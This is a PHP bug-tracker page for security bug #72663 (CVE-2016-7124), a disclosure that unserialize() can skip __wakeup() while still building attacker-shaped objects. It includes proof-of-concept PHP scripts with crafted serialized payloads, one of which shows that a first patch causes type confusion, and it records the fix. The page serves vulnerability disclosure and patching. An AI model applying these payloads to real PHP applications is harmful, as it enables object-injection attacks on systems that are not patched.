<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #72663 - RDF' href='rss/bug.php?id=72663'>
        <link rel='alternate' type='application/rss+xml' title='*General Issues Bug #72663 - RSS 2.0' href='rss/bug.php?id=72663&format=rss2'>
        <base href="https://bugs.php.net/">
    <title>PHP :: Sec Bug #72663 :: Create an Unexpected Object and Don't Invoke __wakeup() in Deserialization</title>
    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
</head>

<body>

<table id="top" class="head" cellspacing="0" cellpadding="0">
    <tr>
        <td class="head-logo">
            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
        </td>

        <td class="head-menu">
            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
            <a href="random">random bug</a>&nbsp;|&nbsp;
            <a href="login.php">login</a>
        </td>
    </tr>

    <tr>
        <td class="head-search" colspan="2">
            <form method="get" action="search.php">
                <p class="head-search">
                    <input type="hidden" name="cmd" value="display">
                    <small>go to bug id or search bugs for</small>
                    <input class="small" type="text" name="search_for" value="" size="30">
                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
                </p>
            </form>
        </td>
    </tr>
</table>

<table class="middle" cellspacing="0" cellpadding="0">
    <tr>
        <td class="content">
<div id="bugheader">
    <table id="details">
        <tr id="title">
            <th class="details" id="number"><a href="bug.php?id=72663">Sec Bug</a>&nbsp;#72663</th>
            <td id="summary" colspan="5">Create an Unexpected Object and Don't Invoke __wakeup() in Deserialization</td>
        </tr>
        <tr id="submission">
            <th class="details">Submitted:</th>
            <td style="white-space: nowrap;">2016-07-24 02:09 UTC</td>
            <th class="details">Modified:</th>
            <td style="white-space: nowrap;">2016-09-05 15:28 UTC</td>
            <td rowspan="6">


            </td>
        </tr>

        <tr id="submitter">
            <th class="details">From:</th>
            <td>taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</td>
            <th class="details">Assigned:</th>
            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
        </tr>

        <tr id="categorization">
            <th class="details">Status:</th>
            <td>Closed</td>
            <th class="details">Package:</th>
            <td><a href="search.php?cmd=display&amp;package_name[]=%2AGeneral+Issues">*General Issues</a></td>
        </tr>

        <tr id="situation">
            <th class="details">PHP Version:</th>
            <td>5.6.24</td>
            <th class="details">OS:</th>
            <td></td>
        </tr>

        <tr id="private">
            <th class="details">Private report:</th>
            <td>No</td>
            <th class="details">CVE-ID:</th>
            <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124" target="_blank">2016-7124</a></td>
        </tr>
    </table>
</div>

<div class="controls">
<span id='control_0' class='control active'>View</span>
<span id='control_3' class='control'><a href='bug.php?id=72663&amp;edit=3'>Add Comment</a></span>
<span id='control_1' class='control'><a href='bug.php?id=72663&amp;edit=1'>Developer</a></span>
<span id='control_2' class='control'><a href='bug.php?id=72663&amp;edit=2'>Edit</a></span>
</div>
<div class="clear"></div>



<div class='comment type_comment' ><a name="1469326177">&nbsp;</a><strong>[2016-07-24 02:09 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Description:
------------
Create an Unexpected Object and Don't Invoke __wakeup() in During Deserialization

```
static inline long object_common1(UNSERIALIZE_PARAMETER, zend_class_entry *ce)
{
...	
	if (ce-&gt;serialize == NULL) {
		object_init_ex(*rval, ce);  &lt;=== create object
...
static inline int object_common2(UNSERIALIZE_PARAMETER, long elements)
{
...
	if (!process_nested_data(UNSERIALIZE_PASSTHRU, Z_OBJPROP_PP(rval), elements, 1)) {  &lt;=== create object properties
		return 0;
	}

	if (Z_OBJCE_PP(rval) != PHP_IC_ENTRY &amp;&amp;
		zend_hash_exists(&amp;Z_OBJCE_PP(rval)-&gt;function_table, &quot;__wakeup&quot;, sizeof(&quot;__wakeup&quot;))) {
		INIT_PZVAL(&amp;fname);
		ZVAL_STRINGL(&amp;fname, &quot;__wakeup&quot;, sizeof(&quot;__wakeup&quot;) - 1, 0);
		BG(serialize_lock)++;
		call_user_function_ex(CG(function_table), rval, &amp;fname, &amp;retval_ptr, 0, 0, 1, NULL TSRMLS_CC);  &lt;=== call to __wakeup()
		BG(serialize_lock)--;
	}
```

If the process_nested_data() return 0, the __wakeup() will not be invoked, but the object and its properties has been created, then the unexpected object will be destroyed (or may not). This may cause some security issues.

i)The unexpected object was destroyed, invoke __destruct()

Some app revents objects deserialization via __wakeup(), ex SugarCRM:

<a href="https://github.com/sugarcrm/sugarcrm_dev/blob/de002ede6b3f62ea9f0e22a49ba281c680bc69d7/Zend/Http/Response/Stream.php" rel="nofollow">https://github.com/sugarcrm/sugarcrm_dev/blob/de002ede6b3f62ea9f0e22a49ba281c680bc69d7/Zend/Http/Response/Stream.php</a>
```
    public function __destruct()
    {
        if(is_resource($this-&gt;stream)) {
            fclose($this-&gt;stream);
            $this-&gt;stream = null;
        }
        if($this-&gt;_cleanup) {
            @unlink($this-&gt;stream_name);
        }
    }
    /**
	 * This is needed to prevent unserialize vulnerability
     */
    public function __wakeup()
    {
        // clean all properties
        foreach(get_object_vars($this) as $k =&gt; $v) {
            $this-&gt;$k = null;
        }
        throw new Exception(&quot;Not a serializable object&quot;);
	}
```

So attacker can bypass __wakeup() and invoke __destruct() with crafted properties.

ii)The unexpected object wasn't destroyed, invoke more magic methods.

Keeping the unexpected object via customized deserialization.

PoC:
```
&lt;?php

class obj implements Serializable {
    var $data;
    function serialize() {
        return serialize($this-&gt;data);
    }
    function unserialize($data) {
        $this-&gt;data = unserialize($data);
    }
}

$inner = 'a:1:{i:0;O:9:&quot;Exception&quot;:2:{s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'file&quot;;R:4;}';
$exploit = 'a:2:{i:0;C:3:&quot;obj&quot;:'.strlen($inner).':{'.$inner.'}i:1;R:4;}';

$data = unserialize($exploit);
echo $data[1];

?&gt;
```

Keeping the unexpected object via session deserialization.

```
PS_SERIALIZER_DECODE_FUNC(php_serialize) /* {{{ */
{
...
	PHP_VAR_UNSERIALIZE_INIT(var_hash);
	ALLOC_INIT_ZVAL(session_vars);
	if (php_var_unserialize(&amp;session_vars, &amp;val, endptr, &amp;var_hash TSRMLS_CC)) {
		var_push_dtor(&amp;var_hash, &amp;session_vars);
	}

	PHP_VAR_UNSERIALIZE_DESTROY(var_hash);
...
	PS(http_session_vars) = session_vars;
```

The unexpected data in during deserialization will be still stored into $_SESSION.

PoC:
```
&lt;?php

ini_set('session.serialize_handler', 'php_serialize');
session_start();
$sess = 'O:9:&quot;Exception&quot;:2:{s:7:&quot;'.&quot;\0&quot;.'*'.&quot;\0&quot;.'file&quot;;R:1;}';
session_decode($sess);
echo $_SESSION;

?&gt;
```


</pre>
</div><h2>Patches</h2>
<p><a href='patch-add.php?bug_id=72663'>Add a Patch</a></p><h2>Pull Requests</h2>
<p><a href='gh-pull-add.php?bug_id=72663'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
            <div id='comments_view' style='clear:both;'>
<div class='comment type_log' ><a name="1470125443">&nbsp;</a><strong>[2016-08-02 08:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Assigned To:</span>
<span class="added">+Assigned To: stas</span>
</div></div></div><div class='comment type_comment' ><a name="1470125444">&nbsp;</a><strong>[2016-08-02 08:10 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>The fix in <a href="https://gist.github.com/58984168c394295e8d22165ccf7c5e5f" rel="nofollow">https://gist.github.com/58984168c394295e8d22165ccf7c5e5f</a>
 and in 7eb78025d4df8facdca70d3cadd907bdb67902a2 in security repo. Please verify.
</pre>
</div><div class='comment type_comment' ><a name="1470134557">&nbsp;</a><strong>[2016-08-02 10:42 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>This patch will lead to type confusion:

```
&lt;?php

ini_set('memory_limit', -1);

class obj {
	var $ryat;
	function __wakeup() {
		$this-&gt;ryat = str_repeat('A', 0x11223344);
	}
}

$poc = 'O:8:&quot;stdClass&quot;:1:{i:0;O:3:&quot;obj&quot;:1:{s:4:&quot;ryat&quot;;R:1;';
unserialize($poc);

?&gt;
```
</pre>
</div><div class='comment type_comment' ><a name="1470609279">&nbsp;</a><strong>[2016-08-07 22:34 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Improved fix in a309b6eb04310119d55ec00e64496ec7b78d6132 and <a href="https://gist.github.com/c745ab7a35f63c7d56854e209deef947" rel="nofollow">https://gist.github.com/c745ab7a35f63c7d56854e209deef947</a>
</pre>
</div><div class='comment type_comment' ><a name="1471073372">&nbsp;</a><strong>[2016-08-13 07:29 UTC] taoguangchen &#x61;&#116; icloud &#x64;&#111;&#x74; com</strong>
<pre class='note'>Can you give me a look at the patch for 7.0/master?
</pre>
</div><div class='comment type_log' ><a name="1471115055">&nbsp;</a><strong>[2016-08-13 19:04 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-PHP Version: 5.5.38</span>
<span class="added">+PHP Version: 5.6.24</span>
</div></div></div><div class='comment type_comment' ><a name="1471115114">&nbsp;</a><strong>[2016-08-13 19:05 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>I don't have one for master yet, but it should not be much different than this one, probably.
</pre>
</div><div class='comment type_log' ><a name="1471241032">&nbsp;</a><strong>[2016-08-15 06:03 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID:</span>
<span class="added">+CVE-ID: needed</span>
</div></div></div><div class='comment type_svn' ><a name="1471413451">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_log' ><a name="1471413452">&nbsp;</a><strong>[2016-08-17 05:57 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-Status: Assigned</span>
<span class="added">+Status: Closed</span>
</div></div></div><div class='comment type_svn' ><a name="1471422223">&nbsp;</a><strong>[2016-08-17 08:23 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_svn' ><a name="1471425341">&nbsp;</a><strong>[2016-08-17 09:15 UTC] <a href="//people.php.net/laruence">laruence@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_svn' ><a name="1471435443">&nbsp;</a><strong>[2016-08-17 12:04 UTC] <a href="//people.php.net/ab">ab@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=20ce2fe8e3c211a42fee05a461a5881be9a8790e" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=20ce2fe8e3c211a42fee05a461a5881be9a8790e</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_svn' ><a name="1471518919">&nbsp;</a><strong>[2016-08-18 11:15 UTC] <a href="//people.php.net/tyrael">tyrael@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=c1cfd6a9fe23765191ea2f654790c7b127d4b797" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=c1cfd6a9fe23765191ea2f654790c7b127d4b797</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_log' ><a name="1473089282">&nbsp;</a><strong>[2016-09-05 15:28 UTC] <a href="//people.php.net/remi">remi@php.net</a></strong>
<div class='log_note'><div class="changeset">
<span class="removed">-CVE-ID: needed</span>
<span class="added">+CVE-ID: 2016-7124</span>
</div></div></div><div class='comment type_svn' ><a name="1476698979">&nbsp;</a><strong>[2016-10-17 10:09 UTC] <a href="//people.php.net/bwoebi">bwoebi@php.net</a></strong>
<pre class='note'>Automatic comment on behalf of stas
Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=448c9be157f4147e121f1a2a524536c75c9c6059</a>
Log: Fix <a href='bug.php?id=72663'>bug #72663</a> - destroy broken object when unserializing
</pre>
</div><div class='comment type_related' ><a name="1481506269">&nbsp;</a><strong>[2016-12-12 01:31 UTC] microsoft &#x61;&#116; yahoo &#x64;&#111;&#x74; com</strong>
<pre class='note'>Related To: <a href='bug.php?id=66673'>Bug #66673</a>
</pre>
</div></div>
        </td>
    </tr>
</table>

<script src='js/util.js'></script>
<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
<script src="js/jquery.cookie.js"></script>
<script>
function do_comment(nd)
{
    $('#comment_filter > .control.active').removeClass("active");
    $(nd).addClass("active");

    $.cookie('history_tab', nd.id, { expires: 365 });

    if (nd.id == 'type_all') {
        $('#comments_view > .comment:hidden').show('slow');
    } else {
        $('#comments_view > .comment').each(function(i) {
            if ($(this).hasClass(nd.id)) {
                $(this).show('slow');
            } else {
                $(this).hide('slow');
            }
        });
    }
    return false;
}
</script>
<table class="foot" cellspacing="0" cellpadding="0">
    <tr>
        <td class="foot-bar" colspan="2">&nbsp;</td>
    </tr>

    <tr>
        <td class="foot-copy">
            <small>
                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
                All rights reserved.
            </small>
        </td>
        <td class="foot-source">
            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
        </td>
    </tr>
</table>
</body>
</html>
